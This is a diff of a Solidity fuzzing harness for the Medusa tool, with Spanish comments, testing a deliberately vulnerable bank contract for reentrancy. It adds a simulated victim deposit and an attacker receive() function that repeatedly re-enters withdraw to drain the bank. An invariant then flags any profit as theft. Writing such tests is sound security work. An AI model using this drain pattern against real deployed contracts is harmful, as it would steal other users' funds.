@@ -3,57 +3,82 @@ pragma solidity 0.8.13;
 
 import "./Reentrancy.sol";
 
-interface Vm {
+// Truco avanzado: Interfaz de Cheatcodes (HEVM) para poder crear dinero de la nada
+interface HEVM {
     function deal(address, uint256) external;
-    function prank(address) external;
 }
 
+// 1. Contrato Fantasma para simular a "los otros usuarios" a los que vamos a robar
+contract Victim {
+    VulnerableBank public bank;
+    constructor(VulnerableBank _bank) {
+        bank = _bank;
+    }
+    // La víctima deposita su propio dinero en el banco
+    function depositToBank(uint256 amount) external {
+        bank.deposit{value: amount}();
+    }
+}
+
+// 2. Contrato de prueba para Medusa que actúa como Atacante
 contract ReentrancyMedusa {
-    VulnerableBank bank;
+    VulnerableBank public bank;
+    uint256 public totalDeposited;
+    uint256 public totalWithdrawn; // ¡NUEVA VARIABLE MAGNÍFICA DEL USUARIO!
+    bool private victimInitialized = false;
 
-    // Cheatcode address for Foundry/Medusa
-    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
-    // Track funds
-    uint256 public my_deposits;
-    uint256 public total_received;
+    // Conectamos a Medusa con los Cheatcodes nativos de la EVM
+    HEVM constant vm = HEVM(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     constructor() {
         bank = new VulnerableBank();
-
-        // SIMULACIÓN DE VICTIMA:
-        // En lugar de simular un usuario completo con prank,
-        // simplemente inyectamos ETH "extra" al banco para que sea solvente.
-        vm.deal(address(bank), 100 ether);
     }
 
-    // Allow Medusa to deposit
+    // SETUP DEL ENTORNO
+    function setUpVictim() public {
+        if (!victimInitialized) {
+            Victim victim = new Victim(bank);
+            // fondo de las victimas +10eth
+            vm.deal(address(victim), 10 ether);
+
+            // victima deposita
+            victim.depositToBank(10 ether);
+            victimInitialized = true;
+        }
+    }
+
+    //Medusa deposita
     function deposit() public payable {
         bank.deposit{value: msg.value}();
-        my_deposits += msg.value;
+        totalDeposited += msg.value;
     }
 
-    // Allow Medusa to withdraw
+    //Medusa retira sus fondos
     function withdraw() public {
-        bank.withdraw();
+        uint256 bal = bank.balances(address(this));
+        if (bal > 0) {
+            bank.withdraw(); // El fallo se ejecutará aquí
+        }
     }
 
-    // Property: We should never profit from the bank (receive more than we deposited)
-    function property_no_profit() public view returns (bool) {
-        return total_received <= my_deposits;
-    }
-
+    // LA TRAMPA: Reentrada asíncrona
+    // Se invocará sola cuando el Banco nos mande nuestro Ether original (porque la EVM secuestra el hilo)
     receive() external payable {
-        // Solo contamos dinero si viene del banco
         if (msg.sender == address(bank)) {
-            total_received += msg.value;
+            totalWithdrawn += msg.value; // Sumamos todo el dinero que el banco nos envía
+            
+            if (address(bank).balance > 0) {
+                bank.withdraw(); // ¡BAM! Volvemos a pedir dinero ANTES de que el Banco ponga nuestro saldo a 0
+            }
         }
+    }
 
-        // Attack Logic:
-        // Si recibimos fondos del banco, intentamos sacar MÁS.
-        // Limitamos el gas para evitar Out of Gas.
-        if (address(bank).balance >= 1 ether && gasleft() > 5000) {
-            try bank.withdraw() {} catch {}
-        }
+    // PROPIEDAD REY (VERSIÓN DEL USUARIO): "El atacante nunca debe ganar más dinero del que depositó"
+    function property_attacker_did_not_steal() public view returns (bool) {
+        if (!victimInitialized) return true; // Ignorar si todavía nadie inyectó 10ETH externos
+        
+        // Si totalWithdrawn es MAYOR que el totalDeposited... significa que hemos robado!
+        // Y por tanto, la aserción de que "no robamos" debe fallar devolviendo FALSE.
+        return totalWithdrawn <= totalDeposited;
     }
 }
